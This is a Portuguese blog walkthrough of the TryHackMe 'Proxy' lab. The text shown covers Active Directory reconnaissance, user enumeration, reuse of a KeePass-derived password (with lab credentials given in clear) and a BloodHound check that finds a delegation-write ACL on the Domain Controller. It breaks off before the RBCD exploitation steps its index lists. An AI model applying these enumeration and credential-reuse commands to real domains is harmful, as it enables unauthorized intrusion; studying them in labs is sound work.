---
layout: post
title: "Proxy - Do Credential Reuse ao SYSTEM no Domain Controller (RBCD)"
description: "Walkthrough TryHackMe Proxy: enumeração AD, KeePass, senha reutilizada, BloodHound, AddAllowedToAct, RBCD, S4U2Proxy, Pass-the-Ticket e PsExec."
date: 2026-10-25
categories: [walkthrough, pentest, windows, tryhackme]
tags: [proxy, active-directory, credential-reuse, keepass, bloodhound, acl, rbcd, kerberos, impacket, s4u2proxy, pass-the-ticket, psexec]
---

# Proxy - Do Credential Reuse ao SYSTEM no Domain Controller (RBCD)

Nesta room do TryHackMe, parti de uma conta comum do domínio Windows e terminei com **SYSTEM no Domain Controller**. O caminho não foi uma vulnerabilidade do kernel nem a senha do Administrator: foi a combinação de **reutilização de senha, uma ACL específica e delegação Kerberos**.

Organizei o que realmente funcionou e os desvios que ensinaram quando insistir em uma pista e quando voltar à enumeração.

> Ambiente de laboratório autorizado. IPs e credenciais são desta execução do TryHackMe; mudam após reset. Alguns comandos alteram objetos do Active Directory.

<a id="indice"></a>

## Índice

| Etapa | Conteúdo |
|---|---|
| Reconhecimento | [1. Mapa](#mapa) · [2. Identificar DC e acesso](#reconhecimento) · [3. Enumerar usuários](#enumeracao) |
| Descoberta | [4. KeePass e Credential Reuse](#reuso) · [5. BloodHound e ACL](#bloodhound) |
| Escalação | [6. Pré-requisitos](#requisitos) · [7. Configurar RBCD](#rbcd) · [8. Tickets S4U](#tickets) · [9. SMB e SYSTEM](#system) |
| Referência | [10. Desvios](#desvios) · [11. Ferramentas](#ferramentas) · [12. Diagnóstico](#diagnostico) · [13. Checklist](#checklist) · [14. Defesa](#defesa) |

<a id="mapa"></a>

## 1. Contexto e mapa da room

| Item | Valor |
|---|---|
| Domínio | <code>ctf.local</code> |
| DC | <code>DC01.ctf.local</code>, IP <code>10.64.163.15</code> |
| SO | Windows Server 2019, build 17763 |
| Acesso inicial deste percurso | <code>j.smith</code> |
| Conta que permitiu escalar | <code>r.williams</code> |
| Objetivo confirmado | Administrator via CIFS, shell SYSTEM |

~~~text
j.smith (usuário comum)
       |
       +--> KeePass --> Helpdesk01!
                            |
                    Credential Reuse
                            v
                        r.williams
                            |
                 AddAllowedToAct em DC01$
                            |
                 MachineAccountQuota = 10
                            |
                         LABPC01$
                            |
                    RBCD no DC01$
                            |
                    S4U2Self/Proxy
                            |
                Ticket CIFS/Administrator
                            |
                SMB (Pwn3d!) + PsExec
                            |
                         SYSTEM
~~~

Na investigação inicial também encontrei o share <code>IT-Shared</code> acessível para Guest (READ/WRITE), e uma automação que executava scripts como <code>CTF\svc.scanner</code>. Foram pistas reais, mas **não vou inventar a ligação entre elas e a obtenção de j.smith**: a cadeia reproduzível abaixo começa com essa conta disponível.

<a id="reconhecimento"></a>

## 2. Identificar o DC e validar acesso

### 2.1 Nmap: procurar os serviços certos

~~~bash
DC_IP=10.64.163.15

nmap -Pn -sT -sV --version-light \
  -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 \
  "$DC_IP"
~~~

Principais resultados:

~~~text
53/tcp DNS       88/tcp Kerberos     389/tcp LDAP
445/tcp SMB      3268/tcp GC        3389/tcp RDP
5985/tcp WinRM   9389/tcp ADWS       Host: DC01
Domain: ctf.local
~~~

| Opção | Função |
|---|---|
| <code>-Pn</code> | Não depende de ping para iniciar a varredura |
| <code>-sT</code> | TCP Connect |
| <code>-sV</code> | Detecção de serviço/versão |
| <code>--version-light</code> | Testes de versão menos intensivos |
| <code>-p</code> | Portas selecionadas |

DNS, LDAP, Kerberos e SMB, junto aos detalhes do host, identificaram o Domain Controller. **Porta aberta não significa vulnerabilidade.** E <code>-Pn</code> não prova que todos os endereços escaneados estão ativos.

### 2.2 Validar credenciais

~~~bash
nxc smb "$DC_IP" -d ctf.local -u j.smith -p 'JSmith@IT2024'
nxc rdp "$DC_IP" -d ctf.local -u j.smith -p 'JSmith@IT2024'
~~~

SMB e RDP aceitaram a conta. Para abrir uma sessão:

~~~bash
xfreerdp /v:"$DC_IP" /u:j.smith /d:ctf.local \
  /p:'JSmith@IT2024' /cert:ignore /dynamic-resolution
~~~

O NetExec serve para validar autenticação; o FreeRDP permite explorar os arquivos e ferramentas do Windows. **Não confunda login RDP com privilégios administrativos**, mesmo quando a ferramenta exibe mensagens chamativas.

<a id="enumeracao"></a>

## 3. Enumerar usuários e descobrir contas relevantes

Com um domínio identificado e credencial válida, prefiro obter contexto sobre usuários antes de tentar exploits locais.

~~~bash
nxc smb "$DC_IP" -d ctf.local \
  -u j.smith -p 'JSmith@IT2024' --users
~~~

LDAP retorna descrição e grupos:

~~~bash
ldapsearch -x -LLL -H "ldap://$DC_IP" \
  -D 'j.smith@ctf.local' -W \
  -b 'DC=ctf,DC=local' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf
~~~

| Opção | Explicação |
|---|---|
| <code>-x</code> | Bind LDAP simples |
| <code>-LLL</code> | Saída limpa |
| <code>-D</code> / <code>-W</code> | Conta e solicitação de senha |
| <code>-b</code> | Base de busca no domínio |
| <code>sAMAccountName</code> | Login |
| <code>description</code> / <code>memberOf</code> | Descrição e grupos |

Para investigar o usuário interessante:

~~~bash
ldapsearch -x -LLL -H "ldap://$DC_IP" \
  -D 'j.smith@ctf.local' -W \
  -b 'DC=ctf,DC=local' \
  '(sAMAccountName=r.williams)' \
  sAMAccountName memberOf description displayName
~~~

Retorno:

~~~text
description: Help Desk Senior
memberOf: CN=sysadmin,CN=Users,DC=ctf,DC=local
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=ctf,DC=local
sAMAccountName: r.williams
~~~

A descrição *Help Desk Senior* e o grupo personalizado <code>sysadmin</code> justificaram investigar a conta. **O nome do grupo não prova que ela é Domain Admin.** O que vale são as permissões efetivas.

<a id="reuso"></a>

## 4. KeePass e Credential Reuse

Durante o acesso autenticado, identifiquei um banco KeePass:

~~~text
C:\Users\j.smith\Documents\Database.kdbx
~~~

Em outras rooms, procuro arquivos desse tipo nas pastas que posso ler, sem varrer o disco inteiro:

~~~powershell
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter '*.kdbx' -File -ErrorAction SilentlyContinue
~~~

> Um arquivo <code>.kdbx</code> é protegido. Encontrá-lo não significa conseguir descriptografá-lo. A investigação permitiu obter a senha <code>Helpdesk01!</code>; como não registrei o método de desbloqueio, não vou inventar essa etapa.

Com uma senha relacionada a HelpDesk e uma conta *Help Desk Senior*, testei **uma hipótese pontual de reutilização**:

~~~bash
nxc smb "$DC_IP" -d ctf.local \
  -u r.williams -p 'Helpdesk01!'
~~~

Resultado confirmado:

~~~text
[+] ctf.local\r.williams:Helpdesk01!
~~~

**Esse foi o pivot real da room.** Em vez de tentar milhões de senhas, utilizei informação já obtida em uma conta relacionada.

Acessei a sessão dessa conta:

~~~bash
xfreerdp /v:"$DC_IP" /u:r.williams /d:ctf.local \
  /p:'Helpdesk01!' /cert:ignore /dynamic-resolution
~~~

No Windows:

~~~powershell
whoami
whoami /groups
whoami /priv
~~~

O token não mostrava <code>SeDebugPrivilege</code> ou <code>SeImpersonatePrivilege</code>. Porém **um usuário sem privilégios locais elevados pode ter direitos de escrita relevantes no Active Directory**.

<a id="bloodhound"></a>

## 5. BloodHound e confirmação da ACL

A AttackBox já tinha **BloodHound Legacy** (Electron + Neo4j), diferente do BloodHound CE. Usei o coletor compatível com Legacy.

~~~bash
pipx install bloodhound

cd /root/reports

/root/.local/bin/bloodhound-python \
  -u r.williams -p 'Helpdesk01!' \
  -d ctf.local \
  -dc dc01.ctf.local \
  -gc dc01.ctf.local \
  -ns 10.64.163.15 \
  --dns-tcp --dns-timeout 15 \
  -c DCOnly --zip
~~~

Importei o ZIP no BloodHound, marquei <code>R.WILLIAMS@CTF.LOCAL</code> como **Owned** e procurei caminhos para objetos críticos. A relação encontrada foi:

~~~text
R.WILLIAMS@CTF.LOCAL
       |
       | AddAllowedToAct
       v
DC01.CTF.LOCAL
~~~

Consulta Cypher para isolar o relacionamento:

~~~cypher
MATCH p=(u:User {name:'R.WILLIAMS@CTF.LOCAL'})
  -[:AddAllowedToAct]->(c:Computer {name:'DC01.CTF.LOCAL'})
RETURN p
~~~

A seção **Windows Abuse** do BloodHound explica a relação; para ter certeza, conferi a ACE no AD.

~~~powershell
Import-Module ActiveDirectory

$dn = (Get-ADComputer DC01).DistinguishedName

(Get-Acl "AD:\$dn").Access |
  Where-Object {
    $_.IdentityReference -match 'r\.williams|sysadmin'
  } |
  Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,IsInherited |
  Format-List
~~~

Resultado real:

~~~text
IdentityReference     : CTF\r.williams
ActiveDirectoryRights : WriteProperty
ObjectType            : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
IsInherited           : False
~~~

O GUID <code>3f78c3e5-f79a-46bd-a0b8-9d18116ddc79</code> identifica o atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>, relacionado à **Resource-Based Constrained Delegation (RBCD)**.

| Conceito | Significado |
|---|---|
| **ACL / ACE** | Lista de permissões / entrada específica |
| **WriteProperty** | Direito de escrever uma propriedade do objeto |
| **AddAllowedToAct** | Relação BloodHound para configurar RBCD |
| **RBCD** | O recurso de destino controla quais identidades podem atuar em seu nome |
| **DC01$** | Conta de máquina do Domain Controller |

**Conclusão da enumeração:** <code>r.williams</code> não precisava ser Domain Admin: tinha direito de escrita no atributo preciso que controla a delegação no objeto <code>DC01$</code>.
